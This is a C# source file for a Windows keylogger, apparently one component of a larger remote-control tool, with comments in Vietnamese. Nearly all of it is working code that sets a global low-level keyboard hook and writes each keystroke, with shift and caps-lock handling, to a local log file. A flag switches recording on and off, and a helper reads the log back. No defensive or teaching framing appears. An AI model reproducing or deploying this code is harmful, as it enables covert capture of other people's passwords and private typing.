using System;
using System.Diagnostics;
using System.Timers;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Text;
using Microsoft.Win32;

namespace KeyLogger
{
    class appstart
    {
        public static string str;
        static ASCIIEncoding encoding = new ASCIIEncoding();
        public static string path = "fileKeyLog.txt";
        public static byte caps = 0, shift = 0, failed = 0;
        
        // --- QUAN TRỌNG: BIẾN CỜ ĐỂ BẬT TẮT ---
        public static bool isRecording = false; 
        // --------------------------------------

        public static void OnTimedEvent(object source, EventArgs e)
        {
        } 
        public static string strLog()
        {
            if (File.Exists(appstart.path))
            {
                str = File.ReadAllText(appstart.path, encoding);
                return str;
            }
            return "";
        }
    }//end of the appstart class

    class InterceptKeys
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        public static void startKLog()
        {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            // --- KIỂM TRA CÔNG TẮC ---
            // Nếu chưa bật (isRecording = false) thì bỏ qua ngay, không làm gì cả.
            if (!appstart.isRecording) 
            {
                return CallNextHookEx(_hookID, nCode, wParam, lParam);
            }

            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                // Dùng try-catch để an toàn, tránh crash Server nếu file đang bị chiếm dụng
                try 
                {
                    using (StreamWriter sw = File.AppendText(appstart.path))
                    {
                        int vkCode = Marshal.ReadInt32(lParam);
                        if (Keys.Shift == Control.ModifierKeys) appstart.shift = 1;
                        switch ((Keys)vkCode)
                        {
                            case Keys.Space:
                                sw.Write(" ");
                                break;
                            case Keys.Return:
                                sw.WriteLine("[Enter]"); // Sửa lại cho dễ nhìn
                                break;
                            case Keys.Back:
                                sw.Write("[Backspace]");
                                break;
                            case Keys.Tab:
                                sw.Write("[Tab]");
                                break;
                            case Keys.D0:
                                if (appstart.shift == 0) sw.Write("0");
                                else sw.Write(")");
                                break;
                            case Keys.D1:
                                if (appstart.shift == 0) sw.Write("1");
                                else sw.Write("!");
                                break;
                            case Keys.D2:
                                if (appstart.shift == 0) sw.Write("2");
                                else sw.Write("@");
                                break;
                            case Keys.D3:
                                if (appstart.shift == 0) sw.Write("3");
                                else sw.Write("#");
                                break;
                            case Keys.D4:
                                if (appstart.shift == 0) sw.Write("4");
                                else sw.Write("$");
                                break;
                            case Keys.D5:
                                if (appstart.shift == 0) sw.Write("5");
                                else sw.Write("%");
                                break;
                            case Keys.D6:
                                if (appstart.shift == 0) sw.Write("6");
                                else sw.Write("^");
                                break;
                            case Keys.D7:
                                if (appstart.shift == 0) sw.Write("7");
                                else sw.Write("&");
                                break;
                            case Keys.D8:
                                if (appstart.shift == 0) sw.Write("8");
                                else sw.Write("*");
                                break;
                            case Keys.D9:
                                if (appstart.shift == 0) sw.Write("9");
                                else sw.Write("(");
                                break;
                            case Keys.LShiftKey:
                            case Keys.RShiftKey:
                            case Keys.LControlKey:
                            case Keys.RControlKey:
                            case Keys.LMenu:
                            case Keys.RMenu:
                            case Keys.LWin:
                            case Keys.RWin:
                            case Keys.Apps:
                                sw.Write("");
                                break;
                            case Keys.OemQuestion:
                                if (appstart.shift == 0) sw.Write("/");
                                else sw.Write("?");
                                break;
                            case Keys.OemOpenBrackets:
                                if (appstart.shift == 0) sw.Write("[");
                                else sw.Write("{");
                                break;
                            case Keys.OemCloseBrackets:
                                if (appstart.shift == 0) sw.Write("]");
                                else sw.Write("}");
                                break;
                            case Keys.Oem1:
                                if (appstart.shift == 0) sw.Write(";");
                                else sw.Write(":");
                                break;
                            case Keys.Oem7:
                                if (appstart.shift == 0) sw.Write("'");
                                else sw.Write('"');
                                break;
                            case Keys.Oemcomma:
                                if (appstart.shift == 0) sw.Write(",");
                                else sw.Write("<");
                                break;
                            case Keys.OemPeriod:
                                if (appstart.shift == 0) sw.Write(".");
                                else sw.Write(">");
                                break;
                            case Keys.OemMinus:
                                if (appstart.shift == 0) sw.Write("-");
                                else sw.Write("_");
                                break;
                            case Keys.Oemplus:
                                if (appstart.shift == 0) sw.Write("=");
                                else sw.Write("+");
                                break;
                            case Keys.Oemtilde:
                                if (appstart.shift == 0) sw.Write("`");
                                else sw.Write("~");
                                break;
                            case Keys.Oem5:
                                sw.Write("|");
                                break;
                            case Keys.Capital:
                                if (appstart.caps == 0) appstart.caps = 1;
                                else appstart.caps = 0;
                                break;
                            default:
                                if (appstart.shift == 0 && appstart.caps == 0) sw.Write(((Keys)vkCode).ToString().ToLower());
                                if (appstart.shift == 1 && appstart.caps == 0) sw.Write(((Keys)vkCode).ToString().ToUpper());
                                if (appstart.shift == 0 && appstart.caps == 1) sw.Write(((Keys)vkCode).ToString().ToUpper());
                                if (appstart.shift == 1 && appstart.caps == 1) sw.Write(((Keys)vkCode).ToString().ToLower());
                                break;
                        } 
                        appstart.shift = 0;
                    }
                }
                catch 
                {
                    // Nếu lỗi ghi file thì bỏ qua, không làm crash server
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        } 
    }
}